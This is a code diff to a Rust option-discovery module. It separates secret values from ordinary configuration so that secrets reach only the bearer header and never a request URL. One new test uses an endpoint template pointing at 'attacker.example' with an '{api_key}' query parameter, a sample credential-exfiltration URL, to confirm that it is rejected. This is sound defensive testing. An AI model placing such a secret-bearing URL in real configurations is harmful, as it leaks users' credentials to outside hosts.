@@ -12,7 +12,7 @@
 //! at the call site. This module returns `Result`/`Option` accordingly and
 //! never panics on a discovery miss.
 
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::sync::LazyLock;
 
 use anyhow::Context;
@@ -68,6 +68,34 @@ pub(crate) fn resolve_template(template: &str, values: &HashMap<String, String>)
             }
         })
         .into_owned()
+}
+
+/// Resolve a bearer template from both ordinary configuration and the
+/// process-local secret values collected for this prompt. Secrets take
+/// precedence if a malformed input supplies the same key in both maps.
+fn resolve_bearer_template(
+    template: &str,
+    public_values: &HashMap<String, String>,
+    secret_values: &HashMap<String, String>,
+) -> String {
+    PLACEHOLDER
+        .replace_all(template, |caps: &regex::Captures<'_>| {
+            let key = &caps[1];
+            secret_values
+                .get(key)
+                .or_else(|| public_values.get(key))
+                .cloned()
+                .unwrap_or_else(|| caps[0].to_string())
+        })
+        .into_owned()
+}
+
+/// Return the first manifest-declared secret referenced by a template.
+fn referenced_secret<'a>(template: &str, secret_keys: &'a HashSet<String>) -> Option<&'a str> {
+    PLACEHOLDER.captures_iter(template).find_map(|captures| {
+        let key = &captures[1];
+        secret_keys.get(key).map(String::as_str)
+    })
 }
 
 /// Decide whether the `Authorization: Bearer` header may be attached to a
@@ -167,7 +195,8 @@ pub(crate) fn parse_options_response(body: &str, select_hint: &str) -> Vec<Strin
 
 /// Resolve the live option list for a dynamic-select field.
 ///
-/// Substitutes `values` into the `http`/`bearer` templates, performs a
+/// Substitutes ordinary configuration into `http` and resolves `bearer` from
+/// both ordinary and process-local secret values, then performs a
 /// `GET`, and parses the response. The `Authorization: Bearer` header is
 /// sent only when `bearer` resolves to a non-empty value after trimming
 /// **and** the resolved fetch host matches the host of the user-configured
@@ -180,9 +209,20 @@ pub(crate) fn parse_options_response(body: &str, select_hint: &str) -> Vec<Strin
 /// empty list). The caller maps `Err` to a free-text fallback.
 pub(crate) async fn fetch_options(
     opts: &OptionsFrom,
-    values: &HashMap<String, String>,
+    public_values: &HashMap<String, String>,
+    secret_values: &HashMap<String, String>,
+    secret_keys: &HashSet<String>,
 ) -> anyhow::Result<Vec<String>> {
-    let url = resolve_template(&opts.http, values);
+    if let Some(key) = referenced_secret(&opts.http, secret_keys) {
+        anyhow::bail!(
+            "options-from http endpoint references secret field '{key}'; secrets are permitted only in the bearer template"
+        );
+    }
+
+    // Deliberately resolve the URL from ordinary configuration only. Secret
+    // material is never placed in this map, so it cannot reach a URL, error,
+    // or endpoint log even if a manifest attempts an undeclared substitution.
+    let url = resolve_template(&opts.http, public_values);
     anyhow::ensure!(
         !url.contains('{'),
         "endpoint still contains unresolved placeholders: {url}"
@@ -195,7 +235,7 @@ pub(crate) async fn fetch_options(
     let bearer = opts
         .bearer
         .as_ref()
-        .map(|b| resolve_template(b, values))
+        .map(|b| resolve_bearer_template(b, public_values, secret_values))
         .map(|b| b.trim().to_string())
         .filter(|b| !b.is_empty());
 
@@ -207,7 +247,7 @@ pub(crate) async fn fetch_options(
     // host of the user-configured `base_url`; otherwise it is withheld (the
     // request will most likely 401 and fall back to free-text — the correct
     // safe outcome).
-    let bearer = bearer.filter(|_| match values.get(PROVIDER_BASE_URL_KEY) {
+    let bearer = bearer.filter(|_| match public_values.get(PROVIDER_BASE_URL_KEY) {
         Some(base_url) if should_send_bearer(&url, base_url) => true,
         _ => {
             tracing::warn!(
@@ -319,7 +359,9 @@ fn decode_capped_body(body: &[u8]) -> anyhow::Result<String> {
 /// maps that to a free-text fallback.
 pub(crate) fn fetch_options_blocking(
     opts: &OptionsFrom,
-    values: &HashMap<String, String>,
+    public_values: &HashMap<String, String>,
+    secret_values: &HashMap<String, String>,
+    secret_keys: &HashSet<String>,
 ) -> anyhow::Result<Vec<String>> {
     std::thread::scope(|scope| {
         scope
@@ -328,7 +370,12 @@ pub(crate) fn fetch_options_blocking(
                     .enable_all()
                     .build()
                     .context("failed to build discovery runtime")?;
-                runtime.block_on(fetch_options(opts, values))
+                runtime.block_on(fetch_options(
+                    opts,
+                    public_values,
+                    secret_values,
+                    secret_keys,
+                ))
             })
             .join()
             .map_err(|_| anyhow::anyhow!("model discovery thread panicked"))?
@@ -456,12 +503,35 @@ mod tests {
             select: None,
             after: vec!["base_url".to_string()],
         };
-        let err = fetch_options(&opts, &HashMap::new())
+        let err = fetch_options(&opts, &HashMap::new(), &HashMap::new(), &HashSet::new())
             .await
             .expect_err("unresolved placeholder must error");
         assert!(
             err.to_string().contains("unresolved placeholder"),
             "got: {err}"
+        );
+    }
+
+    #[tokio::test]
+    async fn fetch_rejects_secret_placeholder_in_http_before_network() {
+        let opts = OptionsFrom {
+            http: "https://attacker.example/models?credential={api_key}".to_string(),
+            bearer: None,
+            select: None,
+            after: vec!["api_key".to_string()],
+        };
+        let secret = "must-not-reach-url-or-error";
+        let secrets = vals(&[("api_key", secret)]);
+        let secret_keys = HashSet::from(["api_key".to_string()]);
+
+        let err = fetch_options(&opts, &HashMap::new(), &secrets, &secret_keys)
+            .await
+            .expect_err("secret URL placeholder must fail before network access");
+        let message = err.to_string();
+        assert!(message.contains("references secret field 'api_key'"));
+        assert!(
+            !message.contains(secret),
+            "error leaked secret bytes: {message}"
         );
     }
 
@@ -573,7 +643,7 @@ mod tests {
             select: None,
             after: vec![],
         };
-        let err = fetch_options(&opts, &HashMap::new())
+        let err = fetch_options(&opts, &HashMap::new(), &HashMap::new(), &HashSet::new())
             .await
             .expect_err("non-http endpoint must error");
         assert!(err.to_string().contains("not an http"), "got: {err}");
@@ -647,7 +717,7 @@ mod tests {
             select: None,
             after: vec![],
         };
-        let err = fetch_options(&opts, &HashMap::new())
+        let err = fetch_options(&opts, &HashMap::new(), &HashMap::new(), &HashSet::new())
             .await
             .expect_err("oversized chunked body must error");
         assert!(
